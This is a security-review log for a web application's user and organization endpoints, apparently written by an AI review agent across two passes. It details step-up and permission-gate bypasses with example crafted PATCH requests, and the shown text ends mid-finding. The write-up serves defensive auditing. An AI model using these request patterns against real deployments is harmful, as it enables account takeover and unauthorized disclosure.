# Security Review 07 — Users & Organizations

**Prefix:** `USR` · **Iteration:** 07 · **Reviewed:** 2026-08-25 (pass 1), 2026-08-27 (pass 2), 2026-09-02 (pass 3), 2026-09-08 (pass 4), 2026-09-14 (pass 5), 2026-09-15 (pass 6), 2026-10-05 (pass 7), 2026-10-13 (pass 8, watchdog pickup), 2026-10-14 (pass 9, PR [#3250](https://github.com/thegspiro/the-logbook/pull/3250) — omitted from this line by that pass, corrected here), 2026-10-18 (pass 10), 2026-10-22 (pass 11), 2026-10-25 (pass 12, watchdog pickup), 2026-10-28 (pass 13, watchdog pickup), 2026-11-01 (pass 14, watchdog pickup) · **PR:** [#1814](https://github.com/thegspiro/the-logbook/pull/1814) (pass 1), [#1949](https://github.com/thegspiro/the-logbook/pull/1949) (pass 2), [#2402](https://github.com/thegspiro/the-logbook/pull/2402) (pass 4), [#2602](https://github.com/thegspiro/the-logbook/pull/2602) (pass 6)

---

## Pass 14 (2026-11-01, watchdog pickup) — real delta (member class/status as two controls, tier ids on the ladder column, position `kind`, per-member-type voting wait), 1 fixed (USR-14, MED)

**Step 0.** `list_pull_requests` (state=open) found 0 open PRs whose head branch starts with `claude/security-review-`. PR #3904 (Feature 06, Elections & ballots, pass 14) had already merged (`eaa75b2cb`); `PROGRESS.md`'s rotation table had row 06 at `✅` and row 07 (Users & organizations) as the first `⬜` on a freshly fetched `main`. The dedicated `/loop 30m /security-review` session remains unreachable per `ListAgents`.

**Scope:** the same twelve files prior passes declared: `endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`, `endpoints/member_leaves.py`, `services/user_service.py`, `services/organization_service.py`, `services/member_leave_service.py`, `models/user.py`, `schemas/user.py`, `schemas/organization.py`, `app/mcp/tools/members.py`, `app/mcp/tools/organization.py`. **Baseline:** `5e8fa0430` (PR #3810's merge, pass 13). **Head:** `origin/main` (`eaa75b2cb`) at review time. `git diff --stat` across the twelve: 339 insertions / 44 deletions across 5 files (`member_status.py`, `users.py`, `models/user.py`, `schemas/organization.py`, `schemas/user.py`) — `organizations.py`, `member_leaves.py`, `user_service.py`, `organization_service.py`, `member_leave_service.py`, and both MCP files are byte-identical to pass 13. `git log --no-merges` against the twelve narrows this to **4 commits touching a declared file directly**; every one read in full via `git show`, not sampled.

**Not a zero-delta pass — four real commits, each reviewed end to end against this feature's files:**

- **`5ec1897d4` (member class and status as two independent controls; a department's own membership tiers become statuses) reviewed in `member_status.py`/`models/user.py`; sound.** `users.member_status` widens from 20 to 50 characters and now holds a department tier id (`senior`) directly, in the spelling `canonical_member_status` fixes, instead of only ever holding one of the seven built-in words. Migration `c4d7e2a91b60` settles existing rows whose legacy `membership_type` column holds a tier id onto the ladder column; `member_class` is deliberately left exactly as stored (an owner decision recorded in the migration's own docstring). `account_status_for_membership`/`sync_account_status_with_membership` (`models/user.py`) now judge the probationary account-status mirror on `member_status` rather than the legacy column, closing a real bug the commit's own message states and a new test (per the commit, not re-derived) confirms: judging on the legacy word collapsed an administrative probationer to plain `administrative`, which kept every probationary member outside the operational class off probation. `_tier_member_counts`/`_counts_by_tier_id` (`member_status.py`) are re-keyed onto the ladder column for the same reason the occupancy check that gates tier removal must see a tier-holding member however their row was written.
- **`4bff9d6d1` (`Position.kind`: office / committee / system) reviewed in `models/user.py`; sound, no permission change.** The new `kind` column (`nullable=False`, `server_default="office"`) only decides which group the profile shows a held position under; the `permissions` column it carries is untouched, and migration `d8f1a4c27b93` settles every existing row through the server default, then marks the seeded system slugs `system` only where `is_system` is set (so a department's own position that happens to be named `captain` is unaffected), then idempotently seeds four grant-free committee positions per organization (checked against `(organization_id, slug)` before each insert, not a bare `INSERT`). No seeded rank's permission set changed (CLAUDE.md Pitfall #23 does not apply — the four committees are new positions, not a revision of an existing one, and carry the same baseline-`member` permission list every member already holds through their own `member` position).
- **`86df394c3` (per-member-type voting waiting period, counted from becoming that type) reviewed in `models/user.py`; sound.** Adds `member_class_since`/`member_status_since` (stamped by `_reconcile_membership`'s new `_stamp_membership_since` helper, using SQLAlchemy's `active_history` to tell a real change from a re-save of the same value) and the per-member override columns `voting_wait_from`/`voting_wait_waived`/`voting_wait_override_reason`. Migration `c7e2a91f4d36` adds all five as nullable or server-defaulted, backfills the two `_since` columns only when both are still NULL (so a re-run cannot overwrite a date the application has since stamped), and states the backfill is a best guess that is not reversed. The two new per-member-override routes this commit adds (`GET`/`PUT /elections/members/{id}/voting-eligibility`) live in `elections.py`, outside this feature's declared file list, and were already reviewed as part of Feature 06 pass 14 (ELEC-51's write-up) — not re-reviewed here to avoid duplicating that pass's work; its `_org_member` org-scoping and `elections.manage` gate are confirmed there.
- **`e790169ef` (mypy ratchet fix)** reviewed in `users.py`; a 2-line type-narrowing of an existing helper's return annotation, no behavior change.

**USR-14 (new) — the organization's own tier-id list, `members.manage`-gated everywhere else, was reachable by any authenticated member through a crafted self-update — FIXED.** `5ec1897d4`'s own `users.py` half (`_accepted_member_status_or_400`, added this same commit) checks a submitted `member_status` tier id against the organization's configured ladder and, on no match, raises 400 with the organization's actual tier ids listed in the detail — correct, and necessary, since the schema-level validator (`schemas/user.py::_known_member_status`) can only check the value's shape, not whether this organization has that tier. But in `update_user_profile` (`users.py`), that lookup ran **before** the function's own restricted-field permission check: `member_status` is one of the six fields `update_user_profile` treats as `members.manage`-only (next to `rank`, `hire_date`, `station`, `platoon`, `membership_number`), yet on a self-update the helper was called unconditionally, ahead of the gate that would otherwise refuse the write. `GET /membership-tiers/config` (`member_status.py`) — the legitimate way to read this same list — requires `members.manage`; the self-update path required nothing beyond being signed in.

## Findings

### USR-14 — MED — A members.manage-gated tier-id list was disclosed through a self-update's own validation error — FIXED

**What:** `update_user_profile` (`PATCH /users/{user_id}/profile`) calls `_accepted_member_status_or_400` whenever `profile_update.member_status is not None`, before the function's restricted-field permission check runs. On an unrecognised value, the helper queries the caller's `Organization` row and raises `HTTPException(400, detail=f"...or one of this organization's membership tiers: {', '.join(sorted(tier_ids))}.")` — the organization's actual configured tier ids, in full. For a non-self update the earlier `members.manage` check (lines 2001–2017) already ran first and would have rejected an unprivileged caller before reaching this point; a **self**-update has no such gate ahead of it, so any authenticated member — including one with no special permission at all — could read this `members.manage`-gated list (the same list `GET /membership-tiers/config` requires that permission to see) by sending `PATCH /users/{own-id}/profile` with a deliberately unrecognised `member_status` value and reading the 400's own detail text.

**Where:** `backend/app/api/v1/endpoints/users.py` — `update_user_profile`, the `if profile_update.member_status is not None:` block (was immediately before the target-user fetch, now additionally gated — see Fix); the information disclosed: `_accepted_member_status_or_400` (`users.py`, added in `5ec1897d4`); the gate it bypassed: the `restricted_fields` check later in the same function (`member_status` is a member of that set) and the equivalent, correctly-ordered gate on `GET /membership-tiers/config` (`member_status.py`).

**Failure scenario:** a member with no permissions beyond the baseline (e.g. a brand-new volunteer) sends `PATCH /users/{their-own-id}/profile` with `{"member_status": "not-a-real-tier"}`. The schema's shape-only validator accepts it (it is a valid slug). The handler is self-updating, so the early `not is_self` permission check never runs; the lookup proceeds, finds no match, and returns 400 with every one of the organization's configured membership tier ids (e.g. custom names a department chose for internal classifications) in the response body — information `members.manage`-holders alone are meant to see.

**Impact:** MED — a genuine authorization-gate bypass (the XC-2 pattern the checklist names: a `.manage`-level list reachable with no permission at all, not merely a weaker one), but bounded to organizational metadata (tier names) rather than PII, credentials, or a write. No member record is created, changed, or read; nothing beyond the tier-id list itself is disclosed.

**Fix:** the `member_status` lookup is now preceded, on a self-update, by the same `members.manage` check `update_user_profile`'s restricted-fields block already performs later in the function for the identical field — reusing its exact permission test and refusal message. A non-self update is unaffected (it is already behind that check before reaching this point). No legitimate caller's behavior changes: a `members.manage` holder updating their own `member_status` still reaches the tier lookup exactly as before; the only behavior change is that an unprivileged self-update with this field set now gets 403 (never reaching the Organization lock or the tier-id lookup) instead of 400-with-the-org's-tier-list.

**Guard tests:** `backend/tests/test_user_profile_permissions.py::TestMemberStatusTierLookupGate` (2 cases) — an unprivileged self-update with an unrecognised `member_status` is refused with 403 after exactly one `db.execute` call (the permission lookup; the Organization tier lookup never runs); a `members.manage` holder doing the same still reaches the tier lookup and gets the original 400 naming the configured tier. The first was confirmed to fail against the pre-fix code (it reached the Organization lookup and raised `AttributeError`/wrong-status-code against the mocked session, rather than 403) before the fix, per CLAUDE.md Pitfall #37.

**Severity reasoning:** MED — a real permission-check-ordering bypass of a documented `members.manage` gate (XC-2), but the information it exposes (tier names) carries no credential, PII, or write capability, which is why this is not rated HIGH alongside USR-13's complete step-up bypass from pass 13.

### Standing findings re-verified unchanged (direct code read, not re-derived)

- **USR-5** (LOW/MED, unbounded lists; accepted) — `get_archived_members` (`member_status.py:1118-1157`) read directly: still a bare `.all()`, no pagination. `user_service.py`/`member_leaves.py`/`member_leave_service.py` byte-identical to pass 13. Unchanged.
- **USR-8** (MED, `GET /users` sends the full roster to every `members.view` holder; accepted) — `list_users` unchanged this window; `user_service.py` untouched.
- **USR-11** (MED, no `require_stepup` on `change_member_status`/`archive_member`) — both handlers re-read directly (`member_status.py:337`, `:973`); neither carries `require_stepup`; `grep -c require_stepup member_status.py` is 0. Unchanged.
- **USR-12** (MED, `update_email_settings`/generic `update_organization_settings` reach the Gmail delegated-service-account capability with no `require_stepup`) — `organizations.py` is byte-identical to pass 13; re-read directly at `:289-295`, confirmed still ungated. Unchanged.

All four remain open, owner-accepted items already mirrored in `docs/KNOWN_LIMITATIONS.md`; nothing new to add there this pass.

**All 87 routes across the four principal files re-enumerated by AST, not sampled** (**34** `users.py` / **30** `organizations.py` / **16** `member_status.py` / **7** `member_leaves.py` — identical counts to pass 13; this window added no route). Every route carries an auth-looking dependency (verified by AST walk for `Depends`/`require_permission`/`require_stepup`/`require_all_permissions` in each handler's parameter defaults — 0 without one). No new `.ilike()`/`.like()` without `escape=`, raw `csv.writer`, or `window.confirm`/`alert`/`prompt` in the diff against any of the twelve backend files (grepped the full `5e8fa0430..origin/main` diff, 0 hits). No frontend file under this feature's module paths changed this window.

## Schema & migration notes

Three new migrations, all reviewed in full: `c4d7e2a91b60` (widens `member_status` 20→50 chars, backfills tier ids from the legacy column onto it — `create_all`-guarded, downgrade NULLs over-length values before narrowing, per Pitfall #26/#35), `d8f1a4c27b93` (adds `positions.kind`, `nullable=False` with `server_default="office"` so existing rows settle without a backfill statement, idempotent committee seeding), `c7e2a91f4d36` (adds the two `_since` columns plus the three voting-wait-override columns, all nullable or server-defaulted, backfill guarded against re-running over application-written dates). All three handle a database `create_all` would build (Pitfall #26) and settle existing rows rather than relying on an implicit default (Pitfall #35). `validate_migrations.py --strict` confirms a single head.

## Guard tests added (pass 14)

`backend/tests/test_user_profile_permissions.py::TestMemberStatusTierLookupGate` (USR-14, 2 cases, detailed above).

## Completion gate (pass 14)

| Check                                                                                                                                                                                                                        | Result                                                                                                                                                                                                                                                                                                          |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `flake8 app/ tests/ alembic/`                                                                                                                                                                                                | ✅ 0 violations                                                                                                                                                                                                                                                                                                 |
| `black --check app/ tests/ alembic/`                                                                                                                                                                                         | ✅ clean, 2776 files unchanged                                                                                                                                                                                                                                                                                  |
| `isort --check-only app/ tests/ alembic/`                                                                                                                                                                                    | ✅ clean                                                                                                                                                                                                                                                                                                        |
| `validate_migrations.py --strict`                                                                                                                                                                                            | ✅ 684 revisions, single head `5781476f2012`                                                                                                                                                                                                                                                                    |
| `scripts/check_route_permissions.py --strict` (repo root)                                                                                                                                                                    | ✅ 283 routes, 0 errors/warnings                                                                                                                                                                                                                                                                                |
| `pytest tests/ -k "user_profile or users_update or member_status or membership_class_status or roles_users_update or user_service or organization" -m "not integration and not slow and not docker"`                         | ✅ 361 passed, 1 environment-only skip (`pywebpush`)                                                                                                                                                                                                                                                            |
| same `-k`, `-m "integration"`                                                                                                                                                                                                | ✅ 198 passed, 1 environment-only skip                                                                                                                                                                                                                                                                          |
| Standing repo-wide guard suites (org-scoping ratchet, capacity locking, CSV sweep, LIKE escaping, `create_all`-table tolerance, baseline member grants, account-status gates, refusal-detail sweep, agency-position seeding) | ✅ 232 passed (one run hit a `Deadlock found` on `test_agency_position_seeding.py` under parallel contention with the other guard files; re-ran alone — 37 passed — and the full batch again — 232 passed — confirming a pre-existing, unrelated lock-contention flake, not a regression from this pass's diff) |
| `cd frontend && npm run typecheck`                                                                                                                                                                                           | ✅ 0 errors                                                                                                                                                                                                                                                                                                     |
| `cd frontend && npm run lint`                                                                                                                                                                                                | ✅ (see PR)                                                                                                                                                                                                                                                                                                     |

---

## Pass 13 (2026-10-28, watchdog pickup) — real delta (phone/address/email/leave-reason encryption at rest, passkey admin routes, numeric bounds, null-refusal fix, forms-embed origin settings, Gmail delegated service account), 1 fixed (USR-13, HIGH), 2 new findings (USR-12 MED flagged; USR-13 HIGH fixed)

**Update (third commit) — USR-13 found and fixed.** A GitHub Copilot review comment on this PR, made while correcting USR-12's write-up (see the second-commit update below), pointed out that the generic `PATCH /organizations/settings` "also accepts `auth` and `file_storage`" — read literally rather than dismissed as a wording nit, this is a complete, unconditional bypass of the `require_stepup` gate pass 12's `8b0ba129` added to the dedicated `/settings/auth` and `/settings/file-storage` routes: the generic route's schema (`OrganizationSettingsUpdate.auth`/`.file_storage`) reaches the identical `OrganizationService.update_organization_settings` write with no step-up dependency of its own. Confirmed exploitable (not merely theoretical): the frontend never submits `auth`/`file_storage` through the generic endpoint (`userServices.ts` calls only the dedicated routes), so nothing legitimate relies on the gap, and `ensure_stepup` — a conditional-step-up helper already used four times in `auth.py` for exactly this "some calls need it, most don't" shape — was sitting unused for settings routes. Fixed by calling `ensure_stepup` in the generic handler whenever the submitted body contains `auth` or `file_storage`. See **USR-13** below.

**Step 0.** `search_pull_requests` for `is:pr is:open head:claude/security-review-` returned 0 matches — no security-review PR open. PR #3809 (Feature 06, Elections & ballots, pass 13) had already merged (`3f1d5b94`) with no open rotation PR behind it. `PROGRESS.md`'s rotation table had row 06 at `✅` and row 07 (Users & organizations) as the first `⬜` on a freshly fast-forwarded `main`, matching the task's own instruction.

Separately: a duplicate-rotation artifact from pass 12 was found and is noted here rather than re-litigated — PR #3696 (also Feature 07, pass 12, opened 7 minutes after the kept PR #3695 by a second concurrent watchdog session) was closed as a duplicate by the repo owner before this pass started; #3695 is the one that merged (`223b4ae7`) and is this pass's baseline. No action needed.

**Scope:** the same twelve files prior passes declared: `endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`, `endpoints/member_leaves.py`, `services/user_service.py`, `services/organization_service.py`, `services/member_leave_service.py`, `models/user.py`, `schemas/user.py`, `schemas/organization.py`, `app/mcp/tools/members.py`, `app/mcp/tools/organization.py`. **Baseline:** `223b4ae7` (PR #3695's merge, pass 12). **Head:** `origin/main` at review time. `git diff --stat 223b4ae7..origin/main` across the twelve: 456 insertions / 54 deletions across 7 files (`member_status.py`, `organizations.py`, `users.py`, `models/user.py`, `schemas/organization.py`, `schemas/user.py`, `organization_service.py`) — `member_leaves.py`, `user_service.py`, `member_leave_service.py`, and both MCP files are byte-identical to pass 12. `git log --no-merges 223b4ae7..origin/main -- <declared files>` narrows this to **11 commits touching a declared file directly**; every one read in full via `git show`, not sampled.

**Not a zero-delta pass — eleven real commits, each reviewed end to end against this feature's files:**

- **`fde3d647` + `b48d63f2` + `4dde59aa` (encrypt phone/address, email, and leave/waiver-reason columns at rest) reviewed in `models/user.py`; all three sound.** `User.phone`, `.mobile`, `.address_street/_city/_state/_zip`, `.email`, `.personal_email` and `MemberLeaveOfAbsence.reason` move to `EncryptedText` (AES-256-GCM); `User.email` gains a companion `email_hash` (keyed HMAC, recomputed on every ORM write via `keep_email_fingerprint`) and the old `idx_user_org_email` unique index is replaced by `idx_user_org_email_hash`. Confirmed no remaining `User.email ==` (or `Prospect.email ==`/`personal_email ==`) equality comparison anywhere in `app/` that would now silently compare ciphertext (`grep -rn "User\.email =="` etc., 0 hits repo-wide) — every comparison site, including the two in this feature's own `users.py` (`create_member`'s duplicate-email check, `update_contact_info`'s email-in-use check), was migrated to `User.email_hash.in_(email_fingerprints(...))` in the same window (`43c11090`), still org-scoped. The three migrations (`5510d5ff49eb`, `b8236e29ec44`, `b74bcce55c11`) are each idempotent (re-running skips ciphertext), refuse to run without `ENCRYPTION_KEY` only when rows exist, handle `create_all`-only tables (Pitfall #26), and `b8236e29ec44` additionally pre-checks for any two members/active-applications that would collide once trimmed/lower-cased before touching any DDL — read in full, not taken on the commit message's word.
- **`9773454e` (`RefusesNull` on `UserUpdate`/`ContactInfoUpdate`) reviewed in `schemas/user.py`; sound, closes a real gap.** Seven fields (role name/description/permissions/priority, contact-info email/notification_preferences, profile `emergency_contacts`) previously accepted an explicit `null` with a 200 and silently left the field unchanged; they now answer 422. No permission behavior changed.
- **`907436a0` (passkeys as a second MFA factor) reviewed in `organizations.py`/`users.py`/`schemas/user.py`; sound — two new routes added to `users.py`, both correctly gated.** `GET /{user_id}/passkeys` (`admin_list_passkeys`) and `DELETE /{user_id}/passkeys/{passkey_id}` (`admin_remove_passkey`) both resolve the target through `_resolve_passkey_admin_target`, which filters on `User.id` **and** `User.organization_id` (XC-3 compliant) before touching anything. `admin_remove_passkey` additionally calls `_enforce_account_reset_ceiling` (the same privilege-ceiling check `delete_user` uses) and carries `_stepup: User = Depends(require_stepup)`, ordered after its `require_permission` dependency — confirmed present in `STEPUP_HANDLERS` (`backend/tests/test_mfa_policy.py:396`) and in the AST-derived `_handlers_with_stepup()` set, so the wiring test's exact-match assertion already covers it. Neither route appears in `tests/permissionless_route_baseline.txt` (correctly — both require `members.manage`/`users.create`). `get_setup_checklist`'s MFA-adoption count (`organizations.py`) now counts a passkey as a second factor alongside `mfa_enabled`, via a correctly-shaped `EXISTS` subquery scoped by `User.id` (no new by-id query).
- **`dd4ba98a` (numeric field bounds) reviewed in `schemas/organization.py`; sound** — `smtp_port` gets `ge=1, le=65535`, `MembershipTier.years_required` gets `le=INT32_MAX`. Narrows acceptable input, does not change any permission or org-scoping logic.
- **`90618aaa` (public-form embedding) reviewed in `organizations.py`/`schemas/organization.py`; sound, and the new route is a genuine header-injection defense.** The one new route in `organizations.py`'s route count, `PATCH /settings/forms` (`update_forms_settings`), is gated on `settings.manage`/`organization.update_settings`, audited (records the origin list, not just "changed"), and writes through the existing deep-copy-based `update_organization_settings` (Pitfall #12 compliant, pre-existing). `FormsSettings.embed_allowed_origins` is bounded (`max_length=MAX_EMBED_ORIGINS` = 10) and validated by `normalize_embed_origin` (`app/utils/embed_origins.py`), which requires an exact `https://host[:port]` origin via a regex that rejects a path, wildcard, or any character (space, semicolon, quote) that could break out of the `Content-Security-Policy: frame-ancestors` header it is written into — read in full, not inferred from the docstring.
- **`097883d8` (Gmail delegated service account) reviewed in `organizations.py`/`schemas/organization.py`/`organization_service.py`; the gating logic itself is sound, but it surfaces a new instance of this same pass's step-up gap — see USR-12 below.** `google_service_account_key` is in `_EMAIL_SECRET_FIELDS`/redacted by `.redacted()` (confirmed, not inferred); `OrganizationService.update_organization_settings`'s new `may_configure_delegated_email` parameter (server-derived from `user_has_permission(current_user, "admin.access")`, never client-supplied) is checked before DDL/writes and raises `PermissionError` (→ 403 via `handle_service_errors`, confirmed in `app/core/utils.py`) whenever the stored section would switch to or keep a service account under a changed identity, or a fresh (non-redacted) key is submitted, and the caller lacks `admin.access`. `check_email_settings` (`POST /settings/email/test`) resolves the real decrypted secret server-side to test it but never echoes it back to the client — only a pass/fail test result.
- **`0a7e2a9e` + `5ff7fbb9` (template-off check, then attachments, for the Member Dropped email) reviewed in `member_status.py`; both sound, notification-correctness fixes rather than security defects.** `5ff7fbb9` additionally fixes a Pitfall #33 violation in the same function (an f-string log message naming the member's email address is replaced with an id-only, argument-formatted one) and resolves template attachments through `confined_template_attachments`, confined to the organization — confirmed, not assumed.

**USR-12 (new) — the Gmail delegated-service-account gate added this window raises the stakes of an existing step-up gap on the route that configures it.** `097883d8` makes `PATCH /organizations/settings/email` able to configure a domain-wide-delegated service account that can send as **any address in the department's Google Workspace domain** — strictly more capability than the SMTP/App-Password/OAuth options the route already held. The route's own permission gate (`settings.manage`/`organization.update_settings`) is unchanged, and the service-layer `admin.access` check for this specific capability is sound (see above) — but `update_email_settings` is not in `STEPUP_HANDLERS`, unlike its two siblings in the identical "Security and policy changes" category, `update_auth_settings` and `update_file_storage_settings`, both of which gained `require_stepup` in pass 12's own `8b0ba129`. A stolen **live session** belonging to an `admin.access` holder (the same precondition `AUTH-23`/`PERM-10`/`PERM-11`/`USR-11` all name) can set up or change this capability with no re-verification — unlike the two sibling settings routes, which would ask for one. Confirmed by reading `update_email_settings` (`organizations.py:269-276`) directly: its `Depends` list carries only `require_permission(...)`, no `require_stepup`.

**Why flagged, not fixed:** same reasoning as `USR-11`/`PERM-10`/`PERM-11`/`AUTH-23` — `STEPUP_HANDLERS` is Feature 01's own pinned, exact-set-equality-checked list (`test_step_up_is_on_exactly_the_documented_handlers`), so adding a handler to it is a deliberate behavior change (every `settings.manage` holder saving _any_ email setting, not just the service-account one, would face a re-verification prompt, since the route has no narrower hook to gate only the dangerous branch without restructuring it) that belongs to the step-up mechanism's owner, not a mechanical fix inside this review. **Severity: MED** — same bound as the sibling findings: a stolen-session attacker gets one additional "security and policy change" outcome without the friction its siblings already impose. Mirrored into `docs/KNOWN_LIMITATIONS.md`.

**All 87 routes across the four principal files re-enumerated by AST, not sampled** (**34** `users.py`, up from 32 for the two new passkey admin routes / **30** `organizations.py`, up from 29 for the new `update_forms_settings` route / 16 `member_status.py`, unchanged / 7 `member_leaves.py`, unchanged). Every route carries an auth-looking dependency (`get_current_user`, `require_permission`, `PermissionChecker`/`AllPermissionChecker`, or `require_stepup` layered on one of those); `member_leaves.py`'s `create_leave_of_absence` (`require_all_permissions`) re-confirmed manually as in pass 12. No new by-id route appeared without an org-scoped fetch. No new `.ilike()`/`.like()` without `escape=`, raw `csv.writer`, or `window.confirm`/`alert`/`prompt` in the diff against any of the twelve backend files (grepped the full `223b4ae7..origin/main` diff for these files, 0 hits). No frontend file under this feature's module paths changed this window (the Gmail service-account frontend "follows separately" per `097883d8`'s own commit message; the passkey frontend and the forms-embed frontend both landed in commits outside `users`/`organizations` module paths and are other features' territory — spot-checked, not reviewed in depth here).

**Re-verified against live source, not re-derived — all three standing findings unchanged, confirmed by reading the current files directly:**

- **USR-5** (LOW/MED, unbounded lists; narrowed by the owner, partially fixed, remainder accepted) — `get_archived_members` (`member_status.py:1113-1152`) read directly: still a bare `.all()` with no pagination, `order_by(User.archived_at.desc())` only. `user_service.py`/`member_leaves.py`/`member_leave_service.py` are byte-identical to pass 12. Unchanged; still accepted per the owner's recorded decision.
- **USR-8** (MED, `GET /users` sends the full roster record to every `members.view`/`users.view` holder; narrowed by the owner via `GET /users/directory`, remainder accepted) — `list_users` (`users.py:144-189`) read directly: still gated on `require_permission("users.view", "members.view", "members.manage")` with contact-field redaction as the only limiter, no row cap. `user_service.py` untouched this window. Still open per the owner's decision, unchanged.
- **USR-11** (MED, step-up gap on `change_member_status`/`archive_member`; flagged pass 12) — both handlers read directly this pass (`member_status.py:332-338`, `:968-973`): neither carries `require_stepup`, and neither is in `STEPUP_HANDLERS` (confirmed at `tests/test_mfa_policy.py:370-397`). Unchanged since pass 12; still an open owner decision.

## Findings

### USR-12 — MED — The Gmail domain-wide-delegated-service-account capability added this pass is reachable through `update_email_settings`, which — unlike its two step-up-gated siblings in the same policy category — requires no re-verification — FLAGGED (not fixed)

**What:** `097883d8` added a Gmail "service account" authentication method to `EmailServiceSettings` that sends through a domain-wide delegated service account, capable of sending as any address in the department's Google Workspace domain. Configuring or changing it requires `admin.access` (checked server-side in `OrganizationService.update_organization_settings`, fails closed) — but the route that reaches it, `PATCH /organizations/settings/email` (`update_email_settings`), carries no `require_stepup`, unlike `update_auth_settings` and `update_file_storage_settings`, both gated in the identical "Security and policy changes" category of `STEPUP_HANDLERS` since pass 12's `8b0ba129`.

**Where:** `backend/app/api/v1/endpoints/organizations.py:269-276` (`update_email_settings`, no `require_stepup`); compare `:` the `update_auth_settings`/`update_file_storage_settings` entries in `backend/tests/test_mfa_policy.py:376-377` (both gated). The `admin.access` gate itself: `backend/app/services/organization_service.py:547-561` (`may_configure_delegated_email` check, sound). **A second, unguarded write path reaches the identical check:** the generic `PATCH /settings` (`update_organization_settings`, `organizations.py:151-194`) accepts a full settings body including `email_service` and calls the same `OrganizationService.update_organization_settings(..., may_configure_delegated_email=...)`, also with no `require_stepup`. A fix confined to `update_email_settings` would leave this route open to the identical attack.

**Google-side prerequisite the scenario above omitted:** this is not "supply any attacker-owned key." `_refresh_error_message` (`backend/app/utils/google_oauth.py:175-196`) shows Google itself refuses to issue a token (`unauthorized_client`) unless the service account's client ID has already been explicitly authorized for the `gmail.send` scope under Domain-wide Delegation in the organization's own Google Admin console — a step only the organization's Google Workspace admin can take, independently of anything the Logbook stores. The attacker therefore needs either a key the organization itself already delegated (most plausibly by stealing that key, not inventing one) or control of the Workspace Admin console — not merely a stolen Logbook session. **Also:** `organization_service.py:562-566` clears the stored key fields whenever the sending identity changes and no fresh key is supplied, so swapping the From address alone, without also supplying an already-authorized key, does not establish the impersonation.

**Failure scenario (revised):** an attacker who has obtained both the **live session** of an organization administrator (the same stolen-cookie/unattended-device precondition `AUTH-23`, `PERM-10`, `PERM-11` and `USR-11` all name) **and** a Gmail service-account key the organization's Google Admin console has already authorized for domain-wide delegation (e.g. by also exfiltrating that key, or by holding Workspace-admin access) can call either `PATCH /organizations/settings/email` or the generic `PATCH /organizations/settings` to set `google_auth_method=service_account` and supply that key, with no second-factor re-verification on the Logbook side — then send email as any address in the department's Workspace domain. The missing re-verification is real, but the blast radius is bounded by that Google-side prerequisite, not by the Logbook session alone — narrower than the sibling findings, which need nothing beyond the stolen session itself.

**Impact:** MED, narrower than first stated — revised after a Copilot review comment on this PR caught both omissions above. A stolen-session attacker reaches one more "security and policy change" outcome without the friction its siblings already impose, but only once they also hold a Gmail service-account key the organization's own Google Admin console has already authorized for domain-wide delegation — the Logbook session alone is not sufficient, unlike the sibling findings. Not a new escalation path (the attacker already holds `admin.access` via the stolen session) and not a secret-disclosure bug (the key is never echoed back); it is a missing re-verification step, gated behind a Google-side prerequisite the Logbook does not control.

**Why flagged, not fixed:** `STEPUP_HANDLERS` is Feature 01's own pinned, exact-set-equality-checked list (`test_step_up_is_on_exactly_the_documented_handlers`), so adding `update_email_settings` to it is a deliberate behavior change — the route also saves ordinary, low-stakes settings (SMTP host, From name, toggling email off), so gating the _whole_ route would ask for re-verification on every save, not just the dangerous branch. A correct fix needs to cover **both** write paths (`update_email_settings` and the generic `update_organization_settings`), likely via either a narrower endpoint for the service-account fields (as `update_file_storage_settings`/`update_auth_settings` already are, narrow routes with a single concern) or a conditional step-up inside the handler shared by both — all are product/architecture decisions for the step-up mechanism's owner, not a mechanical fix inside this review.

**Fix:** not applied. Mirrored into `docs/KNOWN_LIMITATIONS.md`.

**Severity reasoning:** MED — same control gap as `AUTH-23`/`PERM-10`/`PERM-11`/`USR-11`, applied to a fourth instance introduced by this pass's own feature work, not a distinct vulnerability class — but bounded by the Google-side authorization prerequisite, which the sibling findings don't need.

**0 application-code defects fixed this pass** — the one new finding is flagged for an owner decision, consistent with the disposition this rotation already gives the identical mechanism's other gaps.

### USR-13 — HIGH — The generic `PATCH /organizations/settings` bypasses the `require_stepup` gate on `auth`/`file_storage` entirely — FIXED

**What:** `OrganizationSettingsUpdate` (the generic settings-PATCH schema) declares `auth: Optional[AuthSettings]` and `file_storage: Optional[FileStorageSettings]` — the exact same shapes the dedicated `update_auth_settings`/`update_file_storage_settings` routes accept — and the generic handler passes `settings_update.model_dump(exclude_unset=True)` straight through to `OrganizationService.update_organization_settings`, the same service method those two dedicated routes call. The dedicated routes both carry `_stepup: User = Depends(require_stepup)` (added in pass 12's `8b0ba129` specifically to close this class of gap); the generic route carries no step-up dependency at all. Nothing in the service layer or the generic route rejects, ignores, or otherwise special-cases an `auth`/`file_storage` key arriving through it — unlike `email_link_domain` and the S3-activation key, which the same service method already strips from an incoming `settings_update` dict for precisely this reason (`organization_service.py:468-476`, pre-existing).

**Where:** `backend/app/api/v1/endpoints/organizations.py` — generic handler `update_organization_settings` (was `:151-194`, no step-up check); dedicated, correctly-gated siblings `update_auth_settings`/`update_file_storage_settings` (`:831-843`/`:605-613` before this fix). Schema: `backend/app/schemas/organization.py:1634-1659` (`OrganizationSettingsUpdate`, declares both fields with no narrower sub-schema). The pre-existing analogous fix this one mirrors: `backend/app/services/organization_service.py:468-476`.

**Failure scenario:** an attacker who has obtained a `settings.manage` holder's **live session** (no `admin.access` needed — this permission is the same one both dedicated routes already require) calls `PATCH /organizations/settings` with `{"auth": {"provider": "google", "google_client_id": "...", "google_client_secret": "..."}}` or `{"file_storage": {"platform": "s3", ...}}`. Unlike calling the dedicated `/settings/auth` or `/settings/file-storage` routes directly, this is accepted immediately with no re-verification prompt — completely routing around the control pass 12 shipped. Changing the SSO provider lets the attacker redirect future logins through an identity provider they control; changing the file-storage platform redirects where newly uploaded files are read from and written to.

**Why this is HIGH, not MED like its siblings:** `AUTH-23`/`PERM-10`/`PERM-11`/`USR-11`/`USR-12` are all "a capability lacks the re-verification its siblings have." This is different in kind: the re-verification pass 12 already shipped for `auth`/`file_storage` _specifically_ is rendered moot by an alternate route that reaches the identical write. It is a complete bypass of an existing, believed-deployed control, not merely a missing one — and unlike USR-12's Gmail scenario, there is no Google-side (or any other external) prerequisite narrowing it: a stolen Logbook session is sufficient on its own.

